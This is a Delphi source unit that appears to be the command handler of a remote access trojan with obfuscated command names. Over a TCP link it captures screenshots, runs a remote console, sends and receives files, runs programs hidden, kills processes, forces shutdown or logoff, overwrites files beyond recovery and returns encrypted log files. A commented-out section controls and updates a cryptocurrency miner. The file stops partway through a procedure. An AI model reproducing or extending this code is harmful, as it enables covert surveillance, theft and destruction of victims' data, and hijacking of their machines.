unit CliP;

interface

uses
  Windows, Classes, SysUtils, StdCtrls, Math, Graphics, JPEG, ActiveX, ShellApi, TlHelp32, uTypes, uSockets, uFnc, uInfo, uCon, uEnc, uEof, Ming;

type
  cPr = class(TComponent)
  private
    CDT: TCnfg;
    function CyDr(const fromDir, toDir: string): Boolean; // CopyDir
    function MvDr(const fromDir, toDir: string): Boolean; // MoveDir
    function DlDr(dir: string): Boolean; // DelDir
    function FiSir(fileName: wideString): Int64; // FileSizer
    procedure LiDr(Path: string; FileList: TStringList; SubFolder: Boolean; FullPath: Boolean = False); // ListDir
    procedure LiDrFuPa(Path: string; FileList: TStringList; SubFolder: Boolean; FullPath: Boolean = True); // ListDirFullPath
  public
    constructor Create(AOwner: TComponent; Config: TCnfg);
    destructor Destroy; override;
    procedure GtInf(Thread: TTCPConnectionThread; CM: string);    // GetInformation
    procedure GtScSh(Thread: TTCPConnectionThread; CM: string);   // GetScreenShot
    procedure SsPow(Thread: TTCPConnectionThread; CM: string);    // SysPower
    procedure CoRu(Thread: TTCPConnectionThread; CM: string);     // ConsoleRun
    procedure CoSt(Thread: TTCPConnectionThread; CM: string);     // ConsoleStop
    procedure CoCm(Thread: TTCPConnectionThread; CM: string);     // ConsoleCmd
    procedure FiLiFol(Thread: TTCPConnectionThread; CM: string);  // FileListFolder
    procedure FiRc(Thread: TTCPConnectionThread; CM: string);     // FileRecv
    procedure FiSe(Thread: TTCPConnectionThread; CM: string);     // FileSend
    procedure FiRn(Thread: TTCPConnectionThread; CM: string);     // FileRun
    procedure FiRnHd(Thread: TTCPConnectionThread; CM: string);   // FileRunHidden
    procedure FiCtPs(Thread: TTCPConnectionThread; CM: string);   // FileCutPaste
    procedure FiPs(Thread: TTCPConnectionThread; CM: string);     // FilePaste
    procedure FiRnm(Thread: TTCPConnectionThread; CM: string);    // FileRename
    procedure FiDl(Thread: TTCPConnectionThread; CM: string);     // FileDelete
    procedure FiDlH(Thread: TTCPConnectionThread; CM: string);    // FileDeleteHard
    procedure FiCrDr(Thread: TTCPConnectionThread; CM: string);   // FileCreateDir
    procedure FiCrFi(Thread: TTCPConnectionThread; CM: string);   // FileCreateFile
    procedure FiInf(Thread: TTCPConnectionThread; CM: string);    // FileInfo
    procedure FiPrIm(Thread: TTCPConnectionThread; CM: string);   // FilePreviewImg
    procedure FiPrTx(Thread: TTCPConnectionThread; CM: string);   // FilePreviewTxt
    procedure FiNo(Thread: TTCPConnectionThread; CM: string);     // FileNotepad
    procedure FiNoS(Thread: TTCPConnectionThread; CM: string);    // FileNotepadSave
    procedure PrcLi(Thread: TTCPConnectionThread; CM: string);    // ProcessList
    procedure PrcKl(Thread: TTCPConnectionThread; CM: string);    // ProcessKill
    procedure PrcNw(Thread: TTCPConnectionThread; CM: string);    // ProcessNew
    procedure LgLt(Thread: TTCPConnectionThread; CM: string);     // LogList
    procedure LgVw(Thread: TTCPConnectionThread; CM: string);     // LogView
{    procedure MnSt(Thread: TTCPConnectionThread; CM: string);     // MngStart
    procedure MnSto(Thread: TTCPConnectionThread; CM: string);    // MngStop
    procedure MnEal(Thread: TTCPConnectionThread; CM: string);    // MngEnable
    procedure MnDsb(Thread: TTCPConnectionThread; CM: string);    // MngDisable
    procedure MnUp(Thread: TTCPConnectionThread; CM: string);     // MngUpdate   }
  end;

var
  CS: TCon;

implementation

constructor cPr.Create(AOwner: TComponent; Config: TCnfg);
begin
  inherited Create(Owner);
  CDT := Config;

  // Create Console Instance
  if not Assigned(CS) then CS := TCon.Create(Owner);
end;

destructor cPr.Destroy;
begin
  CS.Free;

  inherited Destroy;
end;


{****************************************************************************
                                  Private Functions
****************************************************************************}

function CompressImage(FilePath: string; MaxWH: Integer = 640; Quality: Integer = 50): TJPEGImage;
var
  BMP, BMPR: TBitmap;
  Scale: Double;
begin
  Result := TJPEGImage.Create;
  BMP := TBitmap.Create;

  // Load File
  if POS(ExtractFileExt(FilePath), '|.jpg|.jpeg') > 0 then begin
    Result.Loadfromfile(FilePath);
    Scale := IfThen(Result.Height > Result.Width, MaxWH / Result.Height, MaxWH / Result.Width);

    // Scale
    BMP.Width := Round(Result.Width * Scale);
    BMP.Height := Round(Result.Height * scale);
    BMP.Canvas.StretchDraw(BMP.Canvas.Cliprect, Result);
  end else if ExtractFileExt(FilePath) = '.bmp' then begin
    BMPR := TBitmap.Create;
    BMPR.LoadFromFile(FilePath);
    Scale := IfThen(BMPR.Height > BMPR.Width, MaxWH / BMPR.Height, MaxWH / BMPR.Width);

    // Scale
    BMP.Width := Round(BMPR.Width * Scale);
    BMP.Height := Round(BMPR.Height * scale);
    BMP.Canvas.StretchDraw(BMP.Canvas.Cliprect, BMPR);
    BMPR.Free;
  end;

  // Compress
  try
    Result.CompressionQuality := Quality;
    Result.Assign(BMP);
    Result.Compress;
  finally
    BMP.free;
  end;
end;

function GetDirSize(dir: string; subdir: Boolean): Longint;
var
  rec: TSearchRec;
  found: Integer;
begin
  Result := 0;
  if dir[Length(dir)] <> '\' then dir := dir + '\';
  found := FindFirst(dir + '*.*', faAnyFile, rec);
  while found = 0 do
  begin
    Inc(Result, rec.Size);
    if (rec.Attr and faDirectory > 0) and (rec.Name[1] <> '.') and (subdir = True) then
      Inc(Result, GetDirSize(dir + rec.Name, True));
    found := FindNext(rec);
  end;
  FindClose(rec);
end;

function FormatSize(const bytes: Longint): string;
const
  B = 1;
  KB = 1024 * B;
  MB = 1024 * KB;
  GB = 1024 * MB;
begin
  if bytes <> 0 then
  begin
    if bytes > GB then
      result := FormatFloat('#.## GB', bytes / GB)
    else if bytes > MB then
      result := FormatFloat('#.## MB', bytes / MB)
    else if bytes > KB then
      result := FormatFloat('#.## KB', bytes / KB)
    else
      result := FormatFloat('#.## bytes', bytes);
  end
  else
    result := '';
end;

function cPr.CyDr(const fromDir, toDir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_COPY;
    fFlags := FOF_FILESONLY or FOF_SILENT or FOF_NOCONFIRMATION;
    pFrom := PChar(fromDir + #0);
    pTo := PChar(toDir)
  end;
  Result := (0 = ShFileOperation(fos));
end;

function cPr.MvDr(const fromDir, toDir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_MOVE;
    fFlags := FOF_FILESONLY or FOF_SILENT or FOF_NOCONFIRMATION;
    pFrom := PChar(fromDir + #0);
    pTo := PChar(toDir)
  end;
  Result := (0 = ShFileOperation(fos));
end;

function cPr.DlDr(dir: string): Boolean;
var
  fos: TSHFileOpStruct;
begin
  ZeroMemory(@fos, SizeOf(fos));
  with fos do
  begin
    wFunc := FO_DELETE;
    fFlags := FOF_SILENT or FOF_NOCONFIRMATION;
    pFrom := PChar(dir + #0);
  end;
  Result := (0 = ShFileOperation(fos));
end;

function cPr.FiSir(fileName: wideString): Int64;
var
  SR: TSearchRec;
begin
  if FindFirst(fileName, faAnyFile, sr) = 0 then
    Result := Int64(sr.FindData.nFileSizeHigh) shl Int64(32) + Int64(SR.FindData.nFileSizeLow)
  else
    Result := -1;

  FindClose(SR);
end; {* FileSize -> Dosya Boyutunu Verir *}

procedure cPr.LiDr(Path: string; FileList: TStringList; SubFolder: Boolean; FullPath: Boolean = False);
var
  SR: TSearchRec;
begin
  Path := IncludeTrailingPathDelimiter(Path);

  if FindFirst(Path + '*', faAnyFile, SR) = 0 then
  begin
    repeat
      if (SR.Name = '.') or (SR.Name = '..') then Continue;
      if (SR.Attr = faDirectory) and SubFolder then begin
        FileList.Add(SR.Name);
        FileList.Add('Directory');
        FileList.Add('');
        LiDr(Path + SR.Name, FileList, SubFolder, FullPath);
      end else begin
        if (SR.attr and faDirectory) = faDirectory then begin
          FileList.Add(SR.Name);
          FileList.Add('Directory');
          FileList.Add('');
        end else begin
          FileList.Add(SR.Name);
          FileList.Add(ExtractFileExt(SR.Name));
          FileList.Add(IntToStr(FiSir(Path + SR.Name)));
        end;
      end;
    until FindNext(SR) <> 0;
    FindClose(SR);
  end;
end; {* ListDir -> Belirtilen Dizindeki Dosyalarý Listeler *}

procedure cPr.LiDrFuPa(Path: string; FileList: TStringList; SubFolder: Boolean; FullPath: Boolean = True);
var
  SR: TSearchRec;
begin
  Path := IncludeTrailingPathDelimiter(Path);

  if FindFirst(Path + '*', faAnyFile, SR) = 0 then begin
    repeat
      if (SR.Name = '.') or (SR.Name = '..') then Continue;
      if (SR.Attr = faDirectory) and SubFolder then begin
        LiDrFuPa(Path + SR.Name, FileList, SubFolder, FullPath);
      end else begin
        if (SR.attr and faDirectory) = faDirectory then begin
          //FileList.Add(SR.Name);
        end else begin
          if FullPath then
            FileList.Add(Path + SR.Name)
          else
            FileList.Add(SR.Name);
        end;
      end;
    until FindNext(SR) <> 0;

    FindClose(SR);
  end;
end; {* ListDirFullPath -> Belirtilen Dizindeki Dosyalarý Tam Yol Listeler *}

{****************************************************************************
                                  Process Functions
****************************************************************************}

procedure cPr.GtInf(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
begin
  // Create List
  SL := TStringList.Create;
  CoInitialize(nil);
  SL.AddStrings(GtInBod);
  SL.AddStrings(GtInCu);
  SL.AddStrings(GtInMm(True));
  CoUnInitialize;

  // Convert Stream
  MS := TMemoryStream.Create;
  SL.SaveToStream(MS);
  SL.Free;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end; { GetInformation -> Send Client Information }

procedure cPr.GtScSh(Thread: TTCPConnectionThread; CM: string);
var
  DC: HDC;
  lpPal: PLOGPALETTE;
  RC: TRect;
  BM: TBitmap;
  MS: TMemoryStream;
  JPG: TJPEGImage;
begin
  // Create BMP
  GetWindowRect(GetDesktopWindow, RC);
  BM := TBitmap.Create;
  BM.Width := RC.Right - RC.Left;
  BM.Height := RC.Bottom - RC.Top;
  DC := GetDc(0);
  if (GetDeviceCaps(dc, RASTERCAPS) and RC_PALETTE = RC_PALETTE) then
  begin
    GetMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
    FillChar(lpPal^, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)), #0);
    lpPal^.palVersion := $300;
    lpPal^.palNumEntries := GetSystemPaletteEntries(dc, 0, 256, lpPal^.palPalEntry);
    if (lpPal^.PalNumEntries <> 0) then BM.Palette := CreatePalette(lpPal^);
    FreeMem(lpPal, sizeof(TLOGPALETTE) + (255 * sizeof(TPALETTEENTRY)));
  end;
  BitBlt(BM.Canvas.Handle, 0, 0, RC.Right - RC.Left, RC.Bottom - RC.Top, Dc, 0, 0, SRCCOPY);
  ReleaseDc(0, DC);

  // Convert JPG
  JPG := TJPEGImage.Create;
  JPG.CompressionQuality := 50;
  JPG.Assign(BM);
  JPG.Compress;
  BM.Free;

  // Convert Stream
  MS := TMemoryStream.Create;
  JPG.SaveToStream(MS);
  JPG.Free;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end; (* ScreenShot -> Ekran Resmini Çeker *)

procedure cPr.SsPow(Thread: TTCPConnectionThread; CM: string);
begin
  if CM = DE('6pBEYmvmMTRkgyLK') then begin // sys_poweroff
    RnAA(0, DE('qFhH2HdxeC'), DE('mQc7qvPapOSbsqacTRRq9ZUHVjBn0C'), CDT.iAd, False);
  end;

  if CM = DE('6pBEYmvmMTRk9m1i1G2zXB') then begin // sys_powerrestart
    RnAA(0, DE('qFhH2HdxeC'), DE('mQc7qvPapOSbsqacTVBeKtNonD'), CDT.iAd, False);
  end;

  if CM = DE('6pBEYW+ugYYkiD') then begin // sys_logoff
     ExitWindowsEx(EWX_LOGOFF or EWX_FORCE, 0);
  end;
end;

procedure cPr.CoRu(Thread: TTCPConnectionThread; CM: string);
begin
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(CS.Start));
end; { ConsoleRun -> Konsolu Çalýþtýr }

procedure cPr.CoSt(Thread: TTCPConnectionThread; CM: string);
begin
  if Assigned(CS) then CS.Stop;
end; { ConsoleStop -> Konsolu Sonlandýrýr }

procedure cPr.CoCm(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
  CMD: string;
begin
  // Read Command
  CMD := Thread.Connection.ReadLn;

  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  if CMD <> '' then begin
    CS.Send(PChar(CMD));
    SL.Text := CS.Output;
    SL.SaveToStream(MS);
    SL.Free;
  end;

  // Send
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end; { ConsoleCmd -> Konsolu Komutu Çalýþtýr }

procedure cPr.FiLiFol(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Path: string;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  if CM = DE('vle9JTKGm5ERS8M') then begin // fm_disklist
    DrLi(SL, -1);
    SL.SaveToStream(MS);
    SL.Free;

    Thread.Connection.WriteLn(CM);
    Thread.Connection.WriteInteger(MS.Size);
    Thread.Connection.WriteStream(MS);
  end;

  if CM = DE('vle9Jjq1HLJ4vD') then begin // fm_desktop
    Path := GtSpFo(6);
    if DirectoryExists(Path) then begin
      LiDr(Path, SL, False);
      SL.SaveToStream(MS);
      SL.Free;
    end;

    Thread.Connection.WriteLn(CM);
    Thread.Connection.WriteLn(Path);
    Thread.Connection.WriteInteger(MS.Size);
    Thread.Connection.WriteStream(MS);
  end;

  if CM = DE('vle9YbJStKxoaD') then begin  // fm_userdir
    Path := GtSpFo(5);
    if DirectoryExists(Path) then begin
      LiDr(Path, SL, False);
      SL.SaveToStream(MS);
      SL.Free;
    end;

    Thread.Connection.WriteLn(CM);
    Thread.Connection.WriteLn(Path);
    Thread.Connection.WriteInteger(MS.Size);
    Thread.Connection.WriteStream(MS);
  end;

  if CM = DE('vle9BDTfVHXEkA') then begin // fm_listdir
    Path := Thread.Connection.ReadLn;
    if DirectoryExists(Path) then begin
      LiDr(Path, SL, False);
      SL.SaveToStream(MS);
      SL.Free;
    end;

    Thread.Connection.WriteLn(CM);
    Thread.Connection.WriteLn(Path);
    Thread.Connection.WriteInteger(MS.Size);
    Thread.Connection.WriteStream(MS);
  end;
end; { FileListFolder -> Özel Klasörleri Listeler }

procedure cPr.FiRc(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Path: string;
  Size: Integer;
  SendList: TStringList;
  i: Integer;
  FS: TFileStream;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  // Recv File List
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);
  SL.LoadFromStream(MS);

  // Extract Send Files
  SendList := TStringList.Create;
  if SL.Count > 0 then begin
    for i := 0 to SL.Count - 1 do begin
      if DirectoryExists(SL.Strings[i]) then begin
        LiDrFuPa(SL.Strings[i], SendList, True);
      end else if FileExists(SL.Strings[i]) then begin
        SendList.Add(SL.Strings[i]);
      end;
    end;
  end;

  // Send Files
  if SendList.Count > 0 then begin
    Thread.Connection.WriteLn(CM);
    Thread.Connection.WriteInteger(SendList.Count);

    for i := 0 to SendList.Count - 1 do begin
      FS := TFileStream.Create(SendList.Strings[i], fmOpenRead);
      Thread.Connection.WriteLn(SendList.Strings[i]);
      Thread.Connection.WriteInteger(FS.Size);
      Thread.Connection.WriteStream(FS);
      Thread.Connection.ReadLn;
    end;
  end;
end; { FileRecv -> Dosya Gönderir }

procedure cPr.FiSe(Thread: TTCPConnectionThread; CM: string);
var
  FS: TFileStream;
  i, Count: Integer;
  Size: Cardinal;
  Path: string;
begin
  // Recv File Count
  Count := Thread.Connection.ReadInteger;

  // Recv Files
  for i := 0 to Count - 1 do begin
    Path := Thread.Connection.ReadLn;
    Size := Thread.Connection.ReadInteger;
    FS := TFileStream.Create(Path, fmCreate or fmOpenWrite and fmShareDenyWrite);
    Thread.Connection.ReadStream(FS, Size);
    Thread.Connection.ReadLn;
    Fs.Free;
  end;
end; { FileSend -> Dosya Alýr }

procedure cPr.FiRn(Thread: TTCPConnectionThread; CM: string);
var
  FilePath: string;
begin
  FilePath := Thread.Connection.ReadLn;

  // Run File
  if FileExists(FilePath) then
    RnAA(HWND_DESKTOP, FilePath, '', CDT.iAd, False);
end; { FileRun -> Dosya Çalýþtýrýr }

procedure cPr.FiRnHd(Thread: TTCPConnectionThread; CM: string);
var
  FilePath: string;
begin
  FilePath := Thread.Connection.ReadLn;

  // Run File
  if FileExists(FilePath) then
    RnAA(HWND_DESKTOP, FilePath, '', CDT.iAd, False, SW_HIDE);
end;

procedure cPr.FiCtPs(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
  Size, i: Integer;
  Source: string;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  // Read Stream
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);
  Source := Thread.Connection.ReadLn;
  SL.LoadFromStream(MS);

  // Move Files
  if Source <> '' then
    for i := 0 to SL.Count - 1 do begin
      if FileExists(SL.Strings[i]) then begin
        MoveFile(PChar(SL.Strings[i]), PChar(IncludeTrailingPathDelimiter(Source) + ExtractFileName(SL.Strings[i])));
      end else if DirectoryExists(SL.Strings[i]) then begin
        MvDr(SL.Strings[i], Source);
      end;
    end;
end;

procedure cPr.FiPs(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
  Size, i: Integer;
  Source: string;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  // Read Stream
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);
  Source := Thread.Connection.ReadLn;
  SL.LoadFromStream(MS);

  // Copy Files
  if Source <> '' then
    for i := 0 to SL.Count - 1 do begin
      if FileExists(SL.Strings[i]) then begin
        CopyFile(PChar(SL.Strings[i]), PChar(IncludeTrailingPathDelimiter(Source) + ExtractFileName(SL.Strings[i])), false);
      end else if DirectoryExists(SL.Strings[i]) then begin
        CyDr(SL.Strings[i], Source);
      end;
    end;
end;

procedure cPr.FiRnm(Thread: TTCPConnectionThread; CM: string);
var
  New, Old: string;
begin
  Old := Thread.Connection.ReadLn;
  New := Thread.Connection.ReadLn;

  if (Old <> '') and (New <> '') then begin
    RenameFile(Old, IncludeTrailingPathDelimiter(ExtractFilePath(Old)) + New);
  end;
end;

procedure cPr.FiDl(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Size, i: Integer;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Read Stream
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);
  SL.LoadFromStream(MS);

  // Delete
  for i := 0 to SL.Count - 1 do begin
    if FileExists(SL.Strings[i]) then
      DeleteFile(SL.Strings[i])
    else if DirectoryExists(SL.Strings[i]) then
      DlDr(SL.Strings[i]);
  end;
end;

procedure cPr.FiDlH(Thread: TTCPConnectionThread; CM: string);
  procedure OWF(FileName: string); // Over Write File
  const
    Buffer = 1024;
    Counttowrite = 34;
    FillBuffer: array[0..5] of Integer = ($00, $FF, $00, $F0, $0F, $00);
  var
    Arr: array[1..Buffer] of Byte;
    F: file;
    I, J, N: Integer;
  begin
    AssignFile(F, FileName);
    Reset(F, 1);
    N := FileSize(F);
    for J := 0 to Counttowrite do
    begin
      for I := 1 to N div Buffer do
      begin
        BlockWrite(F, FillBuffer[J], Buffer);
      end;
    end;
    CloseFile(F);
    RenameFile(FileName, ExtractFilepath(FileName) + DE('tw3xA82/bzIpvUE'));
    DeleteFile(ExtractFilepath(FileName) + DE('tw3xA82/bzIpvUE'));
  end;

var
  SL, FL: TStringList;
  MS: TMemoryStream;
  Size, i, k: Integer;
  Name: string;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Read Stream
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);
  SL.LoadFromStream(MS);

  // Delete All Hard
  for i := 0 to SL.Count - 1 do begin
    if FileExists(SL.Strings[i]) then begin
      Name := ExtractFilepath(SL.Strings[i]) + DE('tw3xA82/bzIpvUE');
      try
        RenameFile(SL.Strings[i], Name);
        OWF(Name);
        DeleteFile(Name);
      except
      end;
    end else
      if DirectoryExists(SL.Strings[i]) then begin
        FL := TStringList.Create;
        LiDrFuPa(SL.Strings[i], FL, True);

        for k := 0 to FL.Count - 1 do begin
          Name := ExtractFilepath(FL.Strings[k]) + DE('tw3xA82/bzIpvUE');
          try
            RenameFile(FL.Strings[k], Name);
            OWF(Name);
            DeleteFile(Name);
          except
          end;
        end;

        DlDr(SL.Strings[i]);
      end;
  end;
end;

procedure cPr.FiCrDr(Thread: TTCPConnectionThread; CM: string);
var
  Path: string;
begin
  Path := Thread.Connection.ReadLn;

  if (Path <> '') and (not DirectoryExists(Path)) then
    CreateDir(Path);
end;

procedure cPr.FiCrFi(Thread: TTCPConnectionThread; CM: string);
var
  Path: string;
  SL: TStringList;
begin
  Path := Thread.Connection.ReadLn;

  if (Path <> '') and (not FileExists(Path)) then begin
    SL := TStringList.Create;
    SL.SaveToFile(Path);
  end;
end;

procedure cPr.FiInf(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
  Path: string;

  Attr: Integer;
  SysTime: TSystemTime;
  SHFileInfo: TSHFileInfo;
  SearchRec: TSearchRec;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Get File
  Path := Thread.Connection.ReadLn;

  // Add Info
  if Path <> '' then begin
    ShGetFileInfo(PChar(Path), 0, SHFileInfo, SizeOf(TSHFileInfo), SHGFI_TYPENAME or SHGFI_DISPLAYNAME or SHGFI_ATTRIBUTES);
    FindFirst(Path, 0, SearchRec);

    SL.Add('Name        = ' + SHFileInfo.szDisplayName);
    Sl.Add('Type        = ' + SHFileInfo.szTypeName);
    SL.Add('Full Path   = ' + Path);
    SL.Add('Size        = ' + FormatSize(IfThen(FileExists(Path), SearchRec.Size, GetDirSize(Path, True))));
    FileTimeToSystemTime(SearchRec.FindData.ftCreationTime, SysTime);
    SL.Add('Created     = ' + DateTimeToStr(SystemTimeToDateTime(SysTime)));
    FileTimeToSystemTime(SearchRec.FindData.ftLastWriteTime, SysTime);
    SL.Add('Last Write  = ' + DateTimeToStr(SystemTimeToDateTime(SysTime)));
    FileTimeToSystemTime(SearchRec.FindData.ftLastAccessTime, SysTime);
    SL.Add('Last Access = ' + DateTimeToStr(SystemTimeToDateTime(SysTime)));

    Attr := FileGetAttr(Path);
    SL.Add('ReadOnly    = ' + BlToSt((Attr and faReadOnly) > 0));
    SL.Add('System      = ' + BlToSt((Attr and faSysFile) > 0));
    SL.Add('Hidden      = ' + BlToSt((Attr and faHidden) > 0));
    SL.Add('Directory   = ' + BlToSt((Attr and faDirectory) > 0));

    SL.SaveToStream(MS);
    SL.Free;
  end;

  // Send
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.FiPrIm(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  Path: string;
  JPG: TJPEGImage;
begin
  MS := TMemoryStream.Create;

  // Load File
  Path := Thread.Connection.ReadLn;
  if FileExists(Path) then begin
    with CompressImage(Path, 640, 50) do begin
      SaveToStream(MS);
      Free;
    end;
  end;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.FiPrTx(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Path: string;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Load File
  Path := Thread.Connection.ReadLn;
  if FileExists(Path) then begin
    SL.LoadFromFile(Path);
    SL.SaveToStream(MS);
    SL.Free;
  end;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.FiNo(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Path: string;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Load File
  Path := Thread.Connection.ReadLn;
  if FileExists(Path) then begin
    SL.LoadFromFile(Path);
    SL.SaveToStream(MS);
    SL.Free;
  end;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(Path);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.FiNoS(Thread: TTCPConnectionThread; CM: string);
var
  SL: TStringList;
  MS: TMemoryStream;
  Path: string;
  Size : Integer;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Load Stream
  Path := Thread.Connection.ReadLn;
  Size := Thread.Connection.ReadInteger;
  Thread.Connection.ReadStream(MS, Size);

  // Save File
  if FileExists(Path) then begin
    DeleteFile(Path);
    SL.LoadFromStream(MS);
    SL.SaveToFile(Path);
  end;

  SL.Free;
  MS.Free;
end;

procedure cPr.PrcLi(Thread: TTCPConnectionThread; CM: string);
var
  Proc: PROCESSENTRY32;
  hSnap: HWND;
  Looper: BOOL;
  SL: TStringList;
  MS: TMemoryStream;
begin
  SL := TStringList.Create;
  MS := TMemoryStream.Create;

  // Add Process
  Proc.dwSize := SizeOf(Proc);
  hSnap := CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
  Looper := Process32First(hSnap, Proc);
  while Integer(Looper) <> 0 do begin
    SL.Add(ExtractFileName(Proc.szExeFile));
    SL.Add(IntToStr(Proc.th32ProcessID));
    Looper := Process32Next(hSnap, proc);
  end;
  CloseHandle(hSnap);
  SL.SaveToStream(MS);
  SL.Free;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.PrcKl(Thread: TTCPConnectionThread; CM: string);
var
  ProcID: Integer;
  Status: Boolean;
begin
  // Read ID
  ProcID := Thread.Connection.ReadInteger;

  // Kill
  if ProcID > 0 then begin
    Status := TerminateProcess(OpenProcess(PROCESS_TERMINATE, Bool(1), ProcID), 0)
  end;

  // Send
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(Status));
end;

procedure cPr.PrcNw(Thread: TTCPConnectionThread; CM: string);
var
  ProcName: string;
  ProcID: Integer;
begin
  ProcName := Thread.Connection.ReadLn;

  // Run File
  if FileExists(ProcName) or (ProcName <> '') then
    ProcID := RnAA(HWND_DESKTOP, ProcName, '', CDT.iAd, False);

  // Send Status
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(ProcID > 0));
end; { ProcessNew -> Yeni Ýþlem Baþlatýr }

procedure cPr.LgLt(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  // Listdir
  LiDrFuPa(IncludeTrailingPathDelimiter(CDT.RnDi) + 'Log', SL, False, False);
  SL.SaveToStream(MS);

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

procedure cPr.LgVw(Thread: TTCPConnectionThread; CM: string);
var
  MS: TMemoryStream;
  SL: TStringList;
  LFile: string;
  Context : AnsiString;
begin
  MS := TMemoryStream.Create;
  SL := TStringList.Create;

  // Listdir
  LFile := Thread.Connection.ReadLn;
  if LFile <> '' then
    LFile := IncludeTrailingPathDelimiter(CDT.RnDi) + 'Log\' + LFile;
  if FileExists(LFile) then begin
    Context := DE(EofRF(LFile));
    SL.Text := Context;
  end;
  SL.SaveToStream(MS);
  SL.Free;

  // Send Stream
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteInteger(MS.Size);
  Thread.Connection.WriteStream(MS);
end;

{procedure cPr.MnSt(Thread: TTCPConnectionThread; CM: string);
begin
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(Min.Start(False)));
end;

procedure cPr.MnSto(Thread: TTCPConnectionThread; CM: string);
begin
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(Min.StopMing));
end;

procedure cPr.MnEal(Thread: TTCPConnectionThread; CM: string);
begin
  Min.Enable;
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(CDT.Mng.Eal));
end;

procedure cPr.MnDsb(Thread: TTCPConnectionThread; CM: string);
begin
  Min.Disable;
  Thread.Connection.WriteLn(CM);
  Thread.Connection.WriteLn(BoolToStr(not CDT.Mng.Eal));
end;

procedure cPr.MnUp(Thread: TTCPConnectionThread; CM: string);
var
  Ver, Count, i, Size: Integer;
  xPath, Name, ExNm: String;
  MS : TMemoryStream;
  pc64: Boolean;
begin
  // Get Server Version
  pc64 := I6Bt;

  Ver := Thread.Connection.ReadInteger;
  if pc64 then
    xPath := IncludeTrailingPathDelimiter(CDT.Mng.RnDr) + CDT.Mng.E6Nm
  else
    xPath := IncludeTrailingPathDelimiter(CDT.Mng.RnDr) + CDT.Mng.E3Nm;

  if not Min.CheckBL then begin
    // Create Dir
    ForceDirectories(ExtractFilePath(xPath));

    // Check Version
    if FileExists(xPath) then
      if Ver <= FiVr(xPath) then Exit;

    // Stop All Client
    Min.StopMing;

    // Start File Recv Mode
    Thread.Connection.WriteLn(CM);

